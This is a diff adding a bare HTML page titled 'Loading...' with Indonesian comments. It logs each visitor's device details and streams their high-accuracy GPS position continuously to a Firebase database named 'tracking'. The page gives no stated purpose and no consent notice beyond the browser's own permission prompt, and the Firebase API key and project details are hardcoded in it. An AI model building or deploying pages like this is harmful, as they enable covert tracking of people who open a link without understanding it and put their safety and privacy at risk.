@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+</head>
+<body>
+  <p id="status">Memuat lokasi dan informasi perangkat...</p>
+
+  <script>
+    // Firebase config - ganti dengan punyamu
+    const firebaseConfig = {
+      apiKey: "AIzaSyBmNHpzHzY9lQACbsS6C37iRVYoAhY77uo",
+      authDomain: "tracking-5e86a.firebaseapp.com",
+      databaseURL: "https://tracking-5e86a-default-rtdb.firebaseio.com",
+      projectId: "tracking-5e86a",
+      storageBucket: "tracking-5e86a.firebasestorage.app",
+      messagingSenderId: "812236740548",
+      appId: "1:812236740548:web:071b9e8367e2cd95cdb691"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const userID = "user_" + Math.random().toString(36).substring(2, 10); // ID unik tiap pengunjung
+
+    // Dapatkan info perangkat
+    const deviceInfo = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language
+    };
+
+    db.ref("devices/" + userID).set({
+      device: deviceInfo,
+      createdAt: new Date().toISOString()
+    });
+
+    // Lacak lokasi realtime
+    if ("geolocation" in navigator) {
+      navigator.geolocation.watchPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        document.getElementById("status").textContent = `Lokasi: ${lat}, ${lon}`;
+
+        db.ref("locations/" + userID).set({
+          latitude: lat,
+          longitude: lon,
+          timestamp: new Date().toISOString()
+        });
+      }, err => {
+        document.getElementById("status").textContent = "Gagal mengambil lokasi: " + err.message;
+      }, {
+        enableHighAccuracy: true
+      });
+    } else {
+      document.getElementById("status").textContent = "Geolocation tidak didukung.";
+    }
+  </script>
+</body>
+</html>
